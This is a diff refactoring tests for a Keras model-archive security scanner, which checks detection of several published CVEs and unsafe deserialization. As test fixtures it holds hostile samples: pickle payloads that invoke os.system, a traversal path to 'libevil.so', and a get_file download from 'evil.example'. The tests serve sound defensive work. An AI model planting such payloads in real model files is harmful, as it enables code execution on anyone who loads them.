@@ -8,7 +8,6 @@ The new .keras format is a ZIP archive containing:
 """
 
 import base64
-import builtins
 import json
 import marshal
 import stat
@@ -34,11 +33,22 @@ from modelaudit.utils.file import detection as file_detection
 from modelaudit.utils.file.hdf5 import HDF5_SIGNATURE_SCAN_MAX_BYTES, hdf5_metadata_checksum
 from modelaudit.utils.helpers import cache_decorator as cache_decorator_module
 from tests.helpers import create_mock_onnx, prefix_mock_onnx_with_unknown_field
+from tests.helpers.cache import assert_inconclusive_not_cached as _assert_inconclusive_keras_zip_scan_not_cached
+from tests.helpers.scanners import assert_preflighted_archive_survives_replacement
 
 try:
     import h5py
 except ImportError:  # pragma: no cover - optional dependency in some environments
     h5py = None
+
+
+class _CountingList(list[Any]):
+    item_iterations = 0
+
+    def __iter__(self) -> Iterator[Any]:
+        for item in super().__iter__():
+            type(self).item_iterations += 1
+            yield item
 
 
 def create_configured_keras_zip(
@@ -96,36 +106,6 @@ def _assert_no_stale_inconclusive_metadata(result: ScanResult) -> None:
         if issue.details.get("cve_id") == "CVE-2025-12058":
             assert issue.details.get("analysis_incomplete") is not True
             assert "scan_outcome_reason" not in issue.details
-
-
-def _assert_inconclusive_keras_zip_scan_not_cached(model_path: Path, reason: str, cache_dir: Path) -> None:
-    reset_cache_manager()
-    try:
-        first_result = scan_model_directory_or_file(
-            str(model_path),
-            cache_enabled=True,
-            cache_dir=str(cache_dir),
-            min_cache_file_size=0,
-        )
-        second_result = scan_model_directory_or_file(
-            str(model_path),
-            cache_enabled=True,
-            cache_dir=str(cache_dir),
-            min_cache_file_size=0,
-        )
-
-        for audit_result in (first_result, second_result):
-            metadata = audit_result.file_metadata[str(model_path)]
-            assert determine_exit_code(audit_result) == 2
-            assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
-            assert reason in metadata.get("scan_outcome_reasons")
-            assert not any(
-                issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in audit_result.issues
-            )
-
-        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
-    finally:
-        reset_cache_manager()
 
 
 def test_keras_zip_layer_counts_preserve_colliding_redacted_classes(tmp_path: Path) -> None:
@@ -2132,35 +2112,9 @@ class TestKerasZipScanner:
             archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
             archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo replacement"\ntR.')
 
-        original_scan_archive_members = keras_zip_scanner_module.ZipScanner.scan_archive_members
-        original_open = builtins.open
-        path_reopened = False
-
-        def redirect_path_open(file: Any, *args: Any, **kwargs: Any) -> Any:
-            nonlocal path_reopened
-            if str(file) == str(keras_path):
-                path_reopened = True
-                file = replacement_path
-            return original_open(file, *args, **kwargs)
-
-        def replace_then_scan(
-            scanner: keras_zip_scanner_module.ZipScanner,
-            path: str,
-            archive: zipfile.ZipFile | None = None,
-        ) -> ScanResult:
-            assert archive is not None
-            with monkeypatch.context() as path_swap:
-                path_swap.setattr(builtins, "open", redirect_path_open)
-                return original_scan_archive_members(scanner, path, archive=archive)
-
-        monkeypatch.setattr(keras_zip_scanner_module.ZipScanner, "scan_archive_members", replace_then_scan)
-
-        result = KerasZipScanner().scan(str(keras_path))
-
-        assert path_reopened is False
-        assert not any(issue.details.get("zip_entry") == "payload.pkl" for issue in result.issues)
-        assert any(entry.get("path", "").endswith(":safe.txt") for entry in result.metadata["contents"])
-        assert not any(entry.get("path", "").endswith(":payload.pkl") for entry in result.metadata["contents"])
+        assert_preflighted_archive_survives_replacement(
+            monkeypatch, keras_path, replacement_path, KerasZipScanner, keras_zip_scanner_module.ZipScanner
+        )
 
     def test_read_failure_returns_inconclusive_exit2(
         self,
@@ -2217,15 +2171,7 @@ class TestKerasZipScanner:
             archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
 
         if failure_kind == "read":
-
-            def raise_os_error(
-                _self: KerasZipScanner,
-                _archive: zipfile.ZipFile,
-                _member_name: str,
-            ) -> None:
-                raise OSError("simulated Keras ZIP member read failure")
-
-            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)
+            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", _fail_keras_zip_member_read)
         else:
 
             def raise_runtime_error(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
@@ -2263,15 +2209,7 @@ class TestKerasZipScanner:
             archive.writestr("payload.pkl", b"\x80\x04N.")
 
         if failure_kind == "read":
-
-            def raise_os_error(
-                _self: KerasZipScanner,
-                _archive: zipfile.ZipFile,
-                _member_name: str,
-            ) -> None:
-                raise OSError("simulated Keras ZIP member read failure")
-
-            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)
+            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", _fail_keras_zip_member_read)
         else:
 
             def raise_runtime_error(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
@@ -2913,23 +2851,15 @@ class TestKerasZipScanner:
         tmp_path: Path,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-        keras_path = tmp_path / "ambiguous_mxnet_metadata.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
-            zf.writestr(
-                "metadata.json",
-                '{"nodes":[{"op":"Custom","name":"load","attrs":"'
-                + ("x" * 129)
-                + '"},{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-                '"arg_nodes":[0],"heads":[[1,0,0]]}',
-            )
-
-        result = KerasZipScanner().scan(str(keras_path))
-
-        assert result.success is False
-        assert any(
-            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
+        _assert_ambiguous_mxnet_metadata(
+            tmp_path,
+            monkeypatch,
+            ("ambiguous_mxnet_metadata.keras"),
+            ('{"nodes":[{"op":"Custom","name":"load","attrs":"'),
+            (
+                '"},{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+                '"arg_nodes":[0],"heads":[[1,0,0]]}'
+            ),
         )
 
     def test_scan_fails_closed_for_mxnet_node_object_before_metadata_padding(
@@ -2937,23 +2867,15 @@ class TestKerasZipScanner:
         tmp_path: Path,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-        keras_path = tmp_path / "padded_node_mxnet_metadata.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
-            zf.writestr(
-                "metadata.json",
-                '{"nodes":[{"attrs":"'
-                + ("x" * 129)
-                + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-                '"arg_nodes":[0],"heads":[[0,0,0]]}',
-            )
-
-        result = KerasZipScanner().scan(str(keras_path))
-
-        assert result.success is False
-        assert any(
-            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
+        _assert_ambiguous_mxnet_metadata(
+            tmp_path,
+            monkeypatch,
+            ("padded_node_mxnet_metadata.keras"),
+            ('{"nodes":[{"attrs":"'),
+            (
+                '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+                '"arg_nodes":[0],"heads":[[0,0,0]]}'
+            ),
         )
 
     @pytest.mark.parametrize("initial_nodes", ["[]", "null"])
@@ -2989,23 +2911,12 @@ class TestKerasZipScanner:
         tmp_path: Path,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-        keras_path = tmp_path / "padded_mxnet_metadata.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
-            zf.writestr(
-                "metadata.json",
-                '{"heads":[[0,0,0]],"padding":"'
-                + ("x" * 129)
-                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-                '"arg_nodes":[0]}',
-            )
-
-        result = KerasZipScanner().scan(str(keras_path))
-
-        assert result.success is False
-        assert any(
-            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
+        _assert_ambiguous_mxnet_metadata(
+            tmp_path,
+            monkeypatch,
+            ("padded_mxnet_metadata.keras"),
+            ('{"heads":[[0,0,0]],"padding":"'),
+            ('","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],"arg_nodes":[0]}'),
         )
 
     def test_scan_fails_closed_for_mxnet_nodes_hidden_after_metadata_padding(
@@ -3013,23 +2924,15 @@ class TestKerasZipScanner:
         tmp_path: Path,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-        keras_path = tmp_path / "hidden_mxnet_metadata.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
-            zf.writestr(
-                "metadata.json",
-                '{"padding":"'
-                + ("x" * 129)
-                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-                '"arg_nodes":[0],"heads":[[0,0,0]]}',
-            )
-
-        result = KerasZipScanner().scan(str(keras_path))
-
-        assert result.success is False
-        assert any(
-            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
+        _assert_ambiguous_mxnet_metadata(
+            tmp_path,
+            monkeypatch,
+            ("hidden_mxnet_metadata.keras"),
+            ('{"padding":"'),
+            (
+                '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+                '"arg_nodes":[0],"heads":[[0,0,0]]}'
+            ),
         )
 
     def test_scan_does_not_suppress_mxnet_ambiguity_in_nested_archive(
@@ -3853,27 +3756,7 @@ __import__('pickle').loads(data)
 
     def test_stringlookup_relative_vocabulary_path_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
         """Scalar relative vocabulary paths should be treated as external files."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": "vocab.txt"},
-                    },
-                ],
-            },
-        }
-
-        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
-        result = scanner.scan(str(model_path))
-
-        assert any(
-            check.details.get("cve_id") == "CVE-2025-12058" and check.status == CheckStatus.FAILED
-            for check in result.checks
-        )
+        _assert_relative_vocabulary_cve(tmp_path, ("vocab.txt"))
 
     def test_stringlookup_inline_vocabulary_list_stays_clean(self, tmp_path: Path) -> None:
         """Inline StringLookup vocabularies are benign and should not emit warnings."""
@@ -3986,27 +3869,7 @@ __import__('pickle').loads(data)
 
     def test_stringlookup_windows_home_relative_path_is_detected(self, tmp_path: Path) -> None:
         """Windows-style home-relative vocabulary paths should be normalized and detected."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": "~\\vocab.txt"},
-                    },
-                ],
-            },
-        }
-
-        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
-        result = scanner.scan(str(model_path))
-
-        assert any(
-            check.details.get("cve_id") == "CVE-2025-12058" and check.status == CheckStatus.FAILED
-            for check in result.checks
-        )
+        _assert_relative_vocabulary_cve(tmp_path, ("~\\vocab.txt"))
 
     def test_stringlookup_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
         """Prereleases of the fixed Keras version are still vulnerable."""
@@ -5558,31 +5421,7 @@ __import__('pickle').loads(data)
 
     def test_registered_builtin_layer_does_not_false_positive(self, tmp_path: Path) -> None:
         """Built-in layers with registered_name metadata should remain clean."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Functional",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "InputLayer",
-                        "name": "input_1",
-                        "config": {"batch_shape": [None, 4]},
-                    },
-                    {
-                        "class_name": "Add",
-                        "name": "add_1",
-                        "module": "keras.src.ops.numpy",
-                        "registered_name": "Add",
-                        "config": {},
-                    },
-                ]
-            },
-        }
-
-        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="builtin_registered.keras")))
-
-        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
-        assert all(check.name != "Custom Object Detection" for check in result.checks)
+        _assert_safe_registered_layer(tmp_path, ("Add"), ("add_1"), ("Add"), ("builtin_registered.keras"))
 
     def test_builtin_registered_name_with_non_allowlisted_module_is_flagged(self, tmp_path: Path) -> None:
         """Spoofed built-in registered names must not hide custom modules."""
@@ -5677,31 +5516,7 @@ __import__('pickle').loads(data)
 
     def test_allowlisted_module_layer_does_not_false_positive(self, tmp_path: Path) -> None:
         """Layers from allowlisted Keras modules should not be treated as custom objects."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Functional",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "InputLayer",
-                        "name": "input_1",
-                        "config": {"batch_shape": [None, 4]},
-                    },
-                    {
-                        "class_name": "NotEqual",
-                        "name": "not_equal",
-                        "module": "keras.src.ops.numpy",
-                        "registered_name": "NotEqual",
-                        "config": {},
-                    },
-                ]
-            },
-        }
-
-        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="allowlisted_module.keras")))
-
-        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
-        assert all(check.name != "Custom Object Detection" for check in result.checks)
+        _assert_safe_registered_layer(tmp_path, ("NotEqual"), ("not_equal"), ("NotEqual"), ("allowlisted_module.keras"))
 
     def test_allowlisted_registered_object_without_module_does_not_false_positive_custom_object(
         self, tmp_path: Path
@@ -6301,6 +6116,27 @@ class TestCVE20251550ModuleReferences:
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
         assert all(issue.severity != IssueSeverity.CRITICAL for issue in cve_issues)
 
+    def _assert_safe_native_child(self, tmp_path: Path, module_value: str, layer_name: str) -> None:
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": layer_name,
+                        "config": {"fn_module": module_value},
+                    }
+                ]
+            },
+        }
+
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
+        assert cve_issues
+        assert all(issue.severity != IssueSeverity.CRITICAL for issue in cve_issues)
+
     @pytest.mark.parametrize(
         "module_value",
         [
@@ -6328,25 +6164,7 @@ class TestCVE20251550ModuleReferences:
         module_value: str,
     ) -> None:
         """Native extension modules are not packages with importable dotted children."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "native_child",
-                        "config": {"fn_module": module_value},
-                    }
-                ]
-            },
-        }
-
-        result = scanner.scan(self._make_keras_zip(config, tmp_path))
-
-        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
-        assert cve_issues
-        assert all(issue.severity != IssueSeverity.CRITICAL for issue in cve_issues)
+        self._assert_safe_native_child(tmp_path, module_value, ("native_child"))
 
     def test_native_function_with_string_config_is_critical(self, tmp_path: Path) -> None:
         """Canonical serialized functions must be checked even though their config is a string."""
@@ -6722,28 +6540,9 @@ class TestCVE20251550ModuleReferences:
         module_value: str,
     ) -> None:
         """Dangerous native roots should use exact root matching."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "prefix_collision",
-                        "config": {"fn_module": module_value},
-                    }
-                ]
-            },
-        }
+        self._assert_safe_native_child(tmp_path, module_value, ("prefix_collision"))
 
-        result = scanner.scan(self._make_keras_zip(config, tmp_path))
-
-        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
-        assert cve_issues
-        assert all(issue.severity != IssueSeverity.CRITICAL for issue in cve_issues)
-
-    def test_untrusted_module_custom_package(self, tmp_path: Path) -> None:
-        """Unknown module references in callable context should be flagged as WARNING."""
+    def _assert_untrusted_keras_module(self, tmp_path: Path, module_name: str, failure_message: str) -> None:
         scanner = KerasZipScanner()
         config = {
             "class_name": "Sequential",
@@ -6753,7 +6552,7 @@ class TestCVE20251550ModuleReferences:
                         "class_name": "Lambda",
                         "name": "lambda_1",
                         "config": {
-                            "fn_module": "my_custom_package.layers",
+                            "fn_module": module_name,
                         },
                     }
                 ]
@@ -6762,50 +6561,44 @@ class TestCVE20251550ModuleReferences:
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
-        assert len(cve_issues) >= 1, "Should flag non-allowlisted module"
+        assert len(cve_issues) >= 1, failure_message
         assert cve_issues[0].severity == IssueSeverity.WARNING
+
+    def test_untrusted_module_custom_package(self, tmp_path: Path) -> None:
+        """Unknown module references in callable context should be flagged as WARNING."""
+        self._assert_untrusted_keras_module(
+            tmp_path, ("my_custom_package.layers"), ("Should flag non-allowlisted module")
+        )
+
+    def _assert_safe_keras_module(self, tmp_path: Path, module_name: str, failure_message: str) -> None:
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": module_name,
+                        "config": {"units": 10},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
+        assert len(cve_issues) == 0, failure_message
 
     def test_safe_keras_module_no_false_positive(self, tmp_path: Path) -> None:
         """A layer referencing 'keras.layers' should NOT be flagged."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": "keras.layers",
-                        "config": {"units": 10},
-                    }
-                ]
-            },
-        }
-        result = scanner.scan(self._make_keras_zip(config, tmp_path))
-
-        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
-        assert len(cve_issues) == 0, "Safe keras.layers module should not be flagged"
+        self._assert_safe_keras_module(tmp_path, ("keras.layers"), ("Safe keras.layers module should not be flagged"))
 
     def test_safe_tensorflow_module_no_false_positive(self, tmp_path: Path) -> None:
         """A layer referencing 'tensorflow.keras.layers' should NOT be flagged."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": "tensorflow.keras.layers",
-                        "config": {"units": 10},
-                    }
-                ]
-            },
-        }
-        result = scanner.scan(self._make_keras_zip(config, tmp_path))
-
-        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
-        assert len(cve_issues) == 0, "Safe tensorflow module should not be flagged"
+        self._assert_safe_keras_module(
+            tmp_path, ("tensorflow.keras.layers"), ("Safe tensorflow module should not be flagged")
+        )
 
     def test_nested_model_module_reference(self, tmp_path: Path) -> None:
         """Dangerous module in nested model layer should be detected."""
@@ -6886,47 +6679,17 @@ class TestCVE20251550ModuleReferences:
 
     def test_non_callable_layer_unknown_module_not_flagged(self, tmp_path: Path) -> None:
         """Unknown module on non-callable layers should not produce noisy CVE warnings."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": "my_custom_package.layers",
-                        "config": {"units": 10},
-                    }
-                ]
-            },
-        }
-        result = scanner.scan(self._make_keras_zip(config, tmp_path))
-
-        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
-        assert len(cve_issues) == 0, "Non-callable layer module should not trigger CVE-2025-1550 warning"
+        self._assert_safe_keras_module(
+            tmp_path,
+            ("my_custom_package.layers"),
+            ("Non-callable layer module should not trigger CVE-2025-1550 warning"),
+        )
 
     def test_prefix_collision_module_is_not_allowlisted(self, tmp_path: Path) -> None:
         """Module like 'mathutils.payload' should NOT be treated as safe 'math'."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "lambda_1",
-                        "config": {
-                            "fn_module": "mathutils.payload",
-                        },
-                    }
-                ]
-            },
-        }
-        result = scanner.scan(self._make_keras_zip(config, tmp_path))
-
-        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
-        assert len(cve_issues) >= 1, "mathutils should not match safe 'math' prefix"
-        assert cve_issues[0].severity == IssueSeverity.WARNING
+        self._assert_untrusted_keras_module(
+            tmp_path, ("mathutils.payload"), ("mathutils should not match safe 'math' prefix")
+        )
 
 
 class TestCVE20258747GetFileGadget:
@@ -7424,13 +7187,7 @@ class TestCVE20258747GetFileGadget:
 
         assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
 
-    @pytest.mark.parametrize("archive_format", ["tgz", "tar.gz", "TAR", " tar "])
-    def test_get_file_unsupported_archive_format_no_cve_2025_12060(
-        self,
-        tmp_path: Path,
-        archive_format: str,
-    ) -> None:
-        """Unsupported aliases and normalized variants fail before extraction in Keras."""
+    def _assert_get_file_format_without_cve(self, tmp_path: Path, archive_format: Any) -> None:
         scanner = KerasZipScanner()
         config = {
             "class_name": "Sequential",
@@ -7452,6 +7209,15 @@ class TestCVE20258747GetFileGadget:
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    @pytest.mark.parametrize("archive_format", ["tgz", "tar.gz", "TAR", " tar "])
+    def test_get_file_unsupported_archive_format_no_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        archive_format: str,
+    ) -> None:
+        """Unsupported aliases and normalized variants fail before extraction in Keras."""
+        self._assert_get_file_format_without_cve(tmp_path, archive_format)
 
     @pytest.mark.parametrize("archive_format", [None, [], ["auto", "tar"]])
     def test_get_file_non_tar_effective_format_no_cve_2025_12060(
@@ -7460,27 +7226,7 @@ class TestCVE20258747GetFileGadget:
         archive_format: Any,
     ) -> None:
         """Disabled formats and a list that errors before tar cannot reach tar extraction."""
-        scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "origin": "https://evil.example/payload.tar.gz",
-                            "extract": True,
-                            "archive_format": archive_format,
-                        },
-                    }
-                ]
-            },
-        }
-        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
-
-        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        self._assert_get_file_format_without_cve(tmp_path, archive_format)
 
     @pytest.mark.parametrize(("argument", "value"), [("extract", 1), ("extract", "yes"), ("untar", 1)])
     def test_get_file_truthy_extraction_arguments_detect_cve_2025_12060(
@@ -8160,40 +7906,10 @@ class TestKerasZipConfigTraversalBudget:
         assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
 
     def test_literal_overflow_does_not_hide_queued_unsafe_deserialization(self) -> None:
-        scanner = KerasZipScanner(
-            {
-                "max_config_traversal_items": 100,
-                "max_config_string_literals": 100,
-                "max_config_string_chars": 128,
-            }
-        )
-        scanner.current_file_path = "bounded.keras"
-        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
-        config = [
-            "x" * 129,
-            {"module": "keras.config", "fn": "enable_unsafe_deserialization"},
-        ]
-
-        assert scanner._has_unsafe_deserialization_reference(config, result) is True
-        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+        _assert_queued_unsafe_config(("enable_unsafe_deserialization"), (True))
 
     def test_literal_overflow_does_not_flag_unsafe_deserialization_near_match(self) -> None:
-        scanner = KerasZipScanner(
-            {
-                "max_config_traversal_items": 100,
-                "max_config_string_literals": 100,
-                "max_config_string_chars": 128,
-            }
-        )
-        scanner.current_file_path = "bounded.keras"
-        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
-        config = [
-            "x" * 129,
-            {"module": "keras.config", "fn": "enable_unsafe_deserialization_helper"},
-        ]
-
-        assert scanner._has_unsafe_deserialization_reference(config, result) is False
-        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+        _assert_queued_unsafe_config(("enable_unsafe_deserialization_helper"), (False))
 
     @pytest.mark.parametrize(
         ("callable_name", "expected"),
@@ -8237,13 +7953,8 @@ class TestKerasZipConfigTraversalBudget:
         assert len(cve_issues[0].details["urls"][0]) <= scanner.MAX_CONFIG_SECURITY_LITERAL_CHARS
 
     def test_bounded_projection_limits_root_layer_scanning(self) -> None:
-        class CountingList(list[Any]):
+        class CountingList(_CountingList):
             item_iterations = 0
-
-            def __iter__(self) -> Iterator[Any]:
-                for item in super().__iter__():
-                    type(self).item_iterations += 1
-                    yield item
 
         layers = CountingList({"class_name": "Dense", "config": {}} for _ in range(100))
         config = {"class_name": "Sequential", "config": {"layers": layers}}
@@ -8260,13 +7971,8 @@ class TestKerasZipConfigTraversalBudget:
         assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
 
     def test_bounded_projection_limits_inbound_node_scanning(self) -> None:
-        class CountingList(list[Any]):
+        class CountingList(_CountingList):
             item_iterations = 0
-
-            def __iter__(self) -> Iterator[Any]:
-                for item in super().__iter__():
-                    type(self).item_iterations += 1
-                    yield item
 
         inbound_nodes = CountingList({"args": [], "kwargs": {}} for _ in range(100))
         config = {
@@ -8294,13 +8000,8 @@ class TestKerasZipConfigTraversalBudget:
         assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
 
     def test_bounded_projection_limits_compile_config_recursion(self) -> None:
-        class CountingList(list[Any]):
+        class CountingList(_CountingList):
             item_iterations = 0
-
-            def __iter__(self) -> Iterator[Any]:
-                for item in super().__iter__():
-                    type(self).item_iterations += 1
-                    yield item
 
         metrics: Any = "mean_squared_error"
         for _ in range(100):
@@ -9365,3 +9066,102 @@ class TestKerasZipScannerSubclassed:
             subclass_checks = [c for c in result.checks if "subclassed" in c.name.lower()]
             assert len(subclass_checks) > 0
             assert all(c.status == CheckStatus.PASSED for c in subclass_checks)
+
+
+def _fail_keras_zip_member_read(
+    _self: KerasZipScanner,
+    _archive: zipfile.ZipFile,
+    _member_name: str,
+) -> None:
+    raise OSError("simulated Keras ZIP member read failure")
+
+
+def _assert_queued_unsafe_config(config_name: str, config_value: bool) -> None:
+    scanner = KerasZipScanner(
+        {
+            "max_config_traversal_items": 100,
+            "max_config_string_literals": 100,
+            "max_config_string_chars": 128,
+        }
+    )
+    scanner.current_file_path = "bounded.keras"
+    result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+    config = [
+        "x" * 129,
+        {"module": "keras.config", "fn": config_name},
+    ]
+
+    assert scanner._has_unsafe_deserialization_reference(config, result) is config_value
+    assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+
+def _assert_relative_vocabulary_cve(tmp_path: Path, vocabulary: str) -> None:
+    scanner = KerasZipScanner()
+    config = {
+        "class_name": "Sequential",
+        "config": {
+            "layers": [
+                {
+                    "class_name": "StringLookup",
+                    "name": "string_lookup",
+                    "config": {"vocabulary": vocabulary},
+                },
+            ],
+        },
+    }
+
+    model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
+    result = scanner.scan(str(model_path))
+
+    assert any(
+        check.details.get("cve_id") == "CVE-2025-12058" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def _assert_safe_registered_layer(
+    tmp_path: Path, class_name: str, layer_name: str, registered_name: str, filename: str
+) -> None:
+    scanner = KerasZipScanner()
+    config = {
+        "class_name": "Functional",
+        "config": {
+            "layers": [
+                {
+                    "class_name": "InputLayer",
+                    "name": "input_1",
+                    "config": {"batch_shape": [None, 4]},
+                },
+                {
+                    "class_name": class_name,
+                    "name": layer_name,
+                    "module": "keras.src.ops.numpy",
+                    "registered_name": registered_name,
+                    "config": {},
+                },
+            ]
+        },
+    }
+
+    result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name=filename)))
+
+    assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
+    assert all(check.name != "Custom Object Detection" for check in result.checks)
+
+
+def _assert_ambiguous_mxnet_metadata(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, filename: str, prefix: str, suffix: str
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    keras_path = tmp_path / filename
+    with zipfile.ZipFile(keras_path, "w") as zf:
+        zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
+        zf.writestr(
+            "metadata.json",
+            prefix + ("x" * 129) + suffix,
+        )
+
+    result = KerasZipScanner().scan(str(keras_path))
+
+    assert result.success is False
+    assert any(check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks)
